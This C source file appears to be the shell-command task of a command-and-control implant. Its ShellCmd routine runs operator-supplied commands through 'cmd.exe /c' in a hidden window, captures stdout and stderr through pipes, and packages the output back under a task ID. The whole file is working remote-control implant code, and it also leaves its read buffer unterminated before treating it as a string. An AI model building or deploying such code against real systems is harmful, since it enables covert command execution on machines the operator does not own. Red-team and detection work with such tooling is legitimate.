#include "Tasks/Shell.h"

#include <windows.h>
#include "Parser.h"
#include "Package.h"
#include "Task.h"
#include "Config.h"

#ifdef INCLUDE_CMD_SHELL
VOID ShellCmd(PCHAR taskUuid, PPARSER arguments)
{
    UINT32 nbArg = ParserGetInt32(arguments);

    if (nbArg == 0)
    {
        return;
    }

    SIZE_T size     = 0;
    PCHAR cmd       = ParserGetString(arguments, &size);
    PPackage temp   = PackageInit(0, FALSE);

    HANDLE hStdOutRead      = NULL;
    HANDLE hStdOutWrite     = NULL;
    HANDLE hStdErrRead      = NULL;
    HANDLE hStdErrWrite     = NULL;
    STARTUPINFOA si         = { 0 };
    PROCESS_INFORMATION pi  = { 0 };
    SECURITY_ATTRIBUTES sa  = { 0 };
    DWORD bytesRead         = 0;
    DWORD bytesAvailable    = 0;
    CHAR cmdLine[8192]      = { 0 };
    CHAR buffer[4096];

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    /* Create anonymous pipes for stdout and stderr */
    if ( !CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0) )
    {
        DWORD error = GetLastError();
        _err("[CMD_SHELL] CreatePipe (stdout) failed: %d", error);
        PackageError(taskUuid, error);
        goto CLEANUP;
    }

    if ( !CreatePipe(&hStdErrRead, &hStdErrWrite, &sa, 0) )
    {
        DWORD error = GetLastError();
        _err("[CMD_SHELL] CreatePipe (stderr) failed: %d", error);
        PackageError(taskUuid, error);
        goto CLEANUP;
    }

    SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hStdErrRead, HANDLE_FLAG_INHERIT, 0);

    si.cb           = sizeof(STARTUPINFOA);
    si.hStdOutput   = hStdOutWrite;
    si.hStdError    = hStdErrWrite;
    si.dwFlags      |= STARTF_USESTDHANDLES;

    /* Construct command line: cmd.exe /c "user_command" */
    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c \"%s\"", cmd);

    /* Create the process */
    if ( !CreateProcessA(
        NULL,             // Application name
        cmdLine,          // Command line
        NULL,             // Process security attributes
        NULL,             // Thread security attributes
        TRUE,             // Inherit handles
        CREATE_NO_WINDOW, // Creation flags
        NULL,             // Environment
        NULL,             // Current directory
        &si,              // Startup info
        &pi) )            // Process information
    {
        DWORD error = GetLastError();
        _err("[CMD_SHELL] CreateProcessA failed: %d", error);
        PackageError(taskUuid, error);
        goto CLEANUP;
    }

    /* Close write handles in parent */
    CloseHandle(hStdOutWrite);
    CloseHandle(hStdErrWrite);
    hStdOutWrite = NULL;
    hStdErrWrite = NULL;

    CloseHandle(pi.hThread);
    pi.hThread = NULL;

    DWORD maxWaitTime   = 3000;
    DWORD startTime     = GetTickCount();
    BOOL hasReadAnyData = FALSE;

    /* Read stdout with timeout */
    while ( TRUE )
    {
        if ( PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &bytesAvailable, NULL) )
        {
            if ( bytesAvailable > 0 )
            {
                hasReadAnyData = TRUE;
                
                if ( ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) )
                {
                    if (bytesRead > 0)
                    {
                        PackageAddString(temp, buffer, FALSE);
                    }
                }
                
                continue;
            }
            else
            {
                if ( hasReadAnyData )
                {
                    DWORD exitCode = 0;
                    if ( pi.hProcess && GetExitCodeProcess(pi.hProcess, &exitCode) && exitCode != STILL_ACTIVE )
                    {
                        break;
                    }
                    if ( GetTickCount() - startTime > maxWaitTime )
                    {
                        break;
                    }
                    Sleep(50);
                    continue;
                }
                else
                {
                    if ( GetTickCount() - startTime > maxWaitTime )
                    {
                        break;
                    }
                    Sleep(50);
                    continue;
                }
            }
        }
        else
        {
            DWORD error = GetLastError();
            if ( error == ERROR_BROKEN_PIPE || error == ERROR_INVALID_HANDLE )
            {
                if ( ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0 )
                {
                    PackageAddString(temp, buffer, FALSE);
                }
                break;
            }
            break;
        }
    }

    bytesAvailable = 0;
    if ( PeekNamedPipe(hStdErrRead, NULL, 0, NULL, &bytesAvailable, NULL) )
    {
        while ( bytesAvailable > 0 )
        {
            if ( ReadFile(hStdErrRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
            {
                PackageAddString(temp, buffer, FALSE);
            }
            bytesAvailable = 0;
            PeekNamedPipe(hStdErrRead, NULL, 0, NULL, &bytesAvailable, NULL);
        }
    }


    // Success
    PackageComplete(taskUuid, temp);

CLEANUP:
    if (hStdOutRead) CloseHandle(hStdOutRead);
    if (hStdOutWrite) CloseHandle(hStdOutWrite);
    if (hStdErrRead) CloseHandle(hStdErrRead);
    if (hStdErrWrite) CloseHandle(hStdErrWrite);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);

    PackageDestroy(temp);

    return;
}
#endif